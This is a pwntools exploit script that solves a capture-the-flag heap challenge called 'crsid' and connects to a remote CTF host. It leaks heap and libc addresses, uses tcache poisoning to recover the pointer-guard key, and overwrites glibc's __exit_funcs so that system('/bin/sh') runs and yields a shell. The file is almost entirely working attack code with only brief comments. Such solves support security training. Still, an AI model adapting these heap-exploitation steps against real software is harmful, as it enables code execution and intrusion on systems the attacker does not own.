#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './crsid'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
ld = ELF('glibc/ld-2.34.so')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set resolve-heap-via-heuristic force
    # set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def alloc():
    io.sendlineafter(b'[#] ', b'1')

def free(idx):
    io.sendlineafter(b'[#] ', b'2')
    io.sendlineafter(b': ', str(idx).encode())

def edit(idx, data):
    io.sendlineafter(b'[#] ', b'3')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendafter(b': ', data)

def show(idx):
    io.sendlineafter(b'[#] ', b'4')
    io.sendlineafter(b': ', str(idx).encode())
    io.recvuntil(b'Username: ')
    return io.recvline().strip()

def change_crsid(crsid):
    io.sendlineafter(b'[#] ', b'5')
    io.sendafter(b': ', crsid)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits % max_bits) & (2 ** max_bits - 1) | \
    ((val & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2 ** max_bits - 1)) >> r_bits % max_bits) | \
    (val << (max_bits - (r_bits % max_bits)) & (2 ** max_bits - 1))

encrypt = lambda value, key: rol(value ^ key, 0x11, 64)

def exploit():
    #7rocky's solve script & write up https://7rocky.github.io/en/ctf/htb-challenges/pwn/crsid/#exploit-strategy
    global io
    io = initialize()
    with log.progress('Preparing chunk & leak heap'), context.silent:
        io.sendlineafter(b': ', b'SECRET')
        for _ in range(8):
            alloc()
        for i in reversed(range(8)): #Fill tcache & 1 fastbin
            free(i)
        io.sendline(b'0' * 1023 + b'1') #Basically, scanf if alloc 1024 bytes it will move fastbin to smallbin
        edit(0, b'A')
        heap = demangle(u64(show(0).ljust(8, b'\x00'))) & ~0xfff
    log.info('Heap: %#x', heap)
    with log.progress('Making fake pointer at idx 12 & leak libc'), context.silent:
        target = heap + 0x2a0
        change_crsid(p64(target))
        edit(12, b'B')
        libc_leak = u64(show(12).ljust(8, b'\x00')) & ~0xff
        libc.address = libc_leak - (libc.sym["main_arena"] + 160)
        tls = libc.address + 0x1740
        ld.address = libc.address + 0x204000
    log.info('Libc leak: %#x', libc_leak)
    log.info('Libc base: %#x', libc.address)
    log.info('TLS: %#x', tls)
    log.info('LD: %#x', ld.address)

    with log.progress('Leaking the encrypted exit key'), context.silent:
        for _ in range(7): #Fill tcache
            alloc()
        #Tcache poisoning
        free(1)
        free(7)
        edit(12, p64(mangle(heap, libc.sym["initial"])))
        alloc()
        alloc()
        edit(7, b"A"*0x18)
        encrypt_func = u64(show(7)[0x18:].ljust(8, b'\x00'))
        key = ror(encrypt_func, 0x11, 64) ^ ld.sym["_dl_fini"]
    log.info('_dl_fini: %#x', ld.sym["_dl_fini"])
    log.info('Encrypt func: %#x', encrypt_func)
    log.info('Key: %#x', key)
    log.info('Check encrypt key: %#x', encrypt(ld.sym["_dl_fini"], key))
    log.info('__exit_funcs: %#x', libc.sym["__exit_funcs"])
    with log.progress('Overwriting __exit_funcs'), context.silent:    
        payload = flat({
            0x8: [1, 4, encrypt(libc.sym["system"], key), next(libc.search(b'/bin/sh\x00'))]
        }, filler=b'\x00')
        edit(0, payload)
        payload_pointer = heap + 0x2f0
        free(2)
        free(1)
        edit(12, p64(mangle(heap, libc.sym["__exit_funcs"] - 0x8)))
        alloc()
        alloc()
        edit(2, p64(0) + p64(payload_pointer))
    log.info('Payload pointer: %#x', payload_pointer)

    io.interactive()


if __name__ == '__main__':
    exploit()
